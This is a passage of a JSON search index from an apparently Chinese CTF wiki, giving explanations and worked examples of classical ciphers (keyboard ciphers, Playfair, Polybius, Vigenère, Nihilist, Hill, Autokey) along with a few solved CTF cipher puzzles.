94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002","title":"\u624b\u673a\u952e\u76d8\u5bc6\u7801"},{"location":"crypto/classical/others/#_25","text":"\u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002","title":"\u7535\u8111\u952e\u76d8\u68cb\u76d8"},{"location":"crypto/classical/others/#_26","text":"\u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613","title":"\u7535\u8111\u952e\u76d8\u5750\u6807"},{"location":"crypto/classical/others/#qwe","text":"\u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002","title":"\u7535\u8111\u952e\u76d8 QWE"},{"location":"crypto/classical/others/#_27","text":"\u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002","title":"\u952e\u76d8\u5e03\u5c40\u52a0\u5bc6"},{"location":"crypto/classical/others/#0ctf-2014-classic","text":"\u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb \u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002","title":"0CTF 2014 classic"},{"location":"crypto/classical/others/#2017xman","text":"\u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002 23731263111628163518122316391715262121 \u5bc6\u7801\u683c\u5f0fxman{flag} \u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f 23-x 73-m 12-a 63-n 11-q \u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f xman{ \uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f { \uff0c\u4e8e\u662f\u770b\u4e86\u770b { \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f { \u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a } \u5373\u53ef\u5f97\u5230 flag\u3002 xman{hintisenough} \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002","title":"2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba"},{"location":"crypto/classical/others/#_28","text":"\u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1","title":"\u9898\u76ee"},{"location":"crypto/classical/polyalphabetic/","text":"\u5bf9\u4e8e\u591a\u8868\u66ff\u6362\u52a0\u5bc6\u6765\u8bf4\uff0c\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd\u51e0\u4e4e\u4e0d\u518d\u4fdd\u6301\u539f\u6765\u7684\u9891\u7387\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u53ea\u80fd\u901a\u8fc7\u5bfb\u627e\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u5e94\u7684\u5f31\u70b9\u8fdb\u884c\u7834\u89e3\u3002 Playfair \u00b6 \u539f\u7406 \u00b6 Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a \u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002 \u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002 \u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002 \u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97 P L A Y F I R E X M B C D G H K N O Q S T U V W Z \u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump HI DE TH EG OL DI NT HE TR EX ES TU MP \u5c31\u4f1a\u5f97\u5230 BM OD ZB XD NA BE KU DM UI XM MO UV IF \u5de5\u5177 \u00b6 CAP4 Polybius \u00b6 \u539f\u7406 \u00b6 Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868 1 2 3 4 5 1 A B C D E 2 F G H I/J K 3 L M N O P 4 Q R S T U 5 V W X Y Z \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002 \u53e6\u4e00\u79cd\u5bc6\u7801\u8868 A D F G X A b t a l p D d h o z k F q f v s n G g j c u x X m r e w y \u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002 A D F G X \u7684\u7531\u6765\uff1a 1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002 \u5de5\u5177 \u00b6 CrypTool Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002 \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c \u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u5bc6\u6587\uff1aefkt zferrltzn \u7834\u89e3 \u00b6 \u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002 \u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002 \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002 \u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a \u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB \u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a \u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB \u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD \u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http:// www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ \u3002 \u5de5\u5177 \u00b6 \u5df2\u77e5\u5bc6\u94a5 Python \u7684 pycipher \u5e93 \u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher CAP4 \u672a\u77e5\u5bc6\u94a5 Vigen\u00e8re Cipher Codebreaker Vigenere Solver \uff0c\u4e0d\u591f\u5b8c\u5584\u3002 Nihilist \u00b6 \u539f\u7406 \u00b6 Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002 \u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09 - \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635 - \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635 - \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165 - \u5b57\u6bcd i \u548c j \u7b49\u4ef7 1 2 3 4 5 1 h e l o w 2 r d a b c 3 f g i / j k m 4 n p q s t 5 u v x y z \u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a a -> M[2,3] -> 23 t -> M[4,5] -> 45 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b \u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a 23 -> M[2,3] -> a 45 -> M[4,5] -> t \u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9 \u7eaf\u6570\u5b57 \u53ea\u5305\u542b 1 \u5230 5 \u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002 Hill \u00b6 \u539f\u7406 \u00b6 \u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aACT \u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002 \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \u5bc6\u6587\u5373\u4e3a \u5bc6\u6587\uff1aPOH \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a \u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09 \u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6. \u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b 1 4 7 2 5 8 3 6 10 \u6700\u540e\u7684\u7ed3\u679c\u4e3a overthehillx \u3002 AutokeyCipher \u00b6 \u539f\u7406 \u00b6 \u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5173\u952e\u8bcd\uff1aCULTURE \u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a CULTURE THE QUICK BROWN FOX JUMPS OVER THE \u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a \u5bc6\u6587 VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK \u5de5\u5177 \u00b6 \u5df2\u77e5\u5173\u952e\u8bcd Python \u7684 pycipher \u5e93 \u672a\u77e5\u5173\u952e\u8bcd http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002","title":"\u591a\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/polyalphabetic/#playfair","text":"","title":"Playfair"},{"location":"crypto/classical/polyalphabetic/#_1","text":"Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a \u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002 \u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002 \u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002 